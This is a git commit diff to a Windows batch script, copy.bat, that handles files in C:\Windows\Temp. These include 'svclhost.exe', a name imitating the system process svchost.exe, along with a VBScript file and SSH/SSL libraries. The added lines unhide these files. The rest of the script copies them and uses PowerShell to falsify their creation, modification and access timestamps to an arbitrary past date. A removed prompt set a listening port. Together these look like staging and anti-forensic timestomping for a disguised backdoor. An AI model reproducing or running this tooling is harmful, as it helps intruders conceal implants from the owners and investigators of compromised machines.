76f74fc35f6d73f124adc200af4de6fb508e8a9e
NoManCan <tiger_man_student@yahoo.com>
2025-06-14 13:14:02 +0400

    Update copy.bat

--- copy.bat
+++ copy.bat
@@ -1,6 +1,13 @@
 @echo off & mode 16,1
 cd "C:\Windows\Temp"
 mkdir 0test0
+
+attrib -h -s "C:\Windows\Temp\svclhost.exe"
+attrib -h -s "C:\Windows\Temp\svclhost.vbs"
+attrib -h -s "C:\Windows\Temp\libcrypto-3.dll"
+attrib -h -s "C:\Windows\Temp\libssh2.dll"
+attrib -h -s "C:\Windows\Temp\libssl-3.dll"
+
 copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\Temp\0test0\libcrypto-3.dll"
 copy /y "C:\Windows\Temp\libssh2.dll" "C:\Windows\Temp\0test0\libssh2.dll"
 copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\Temp\0test0\libssl-3.dll"
@@ -14,10 +21,8 @@ set "n_pt="
 
 set /P n_date=Enter Required Date (MM/DD/YYYY): 
 set /P n_time=Enter Required Time (HH:MM:SS): 
-set /P n_pt=Enter Port (4425): 
 if not defined n_date (set n_date=01/16/2022)
 if not defined n_time (set n_time=11:24:47)
-if not defined n_pt (set n_pt=4425)
 
 powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Object{$_.LastWriteTime = ('%n_date% %n_time%');$_.CreationTime = ('%n_date% %n_time%');$_.LastAccessTime = ('%n_date% %n_time%')}"
 
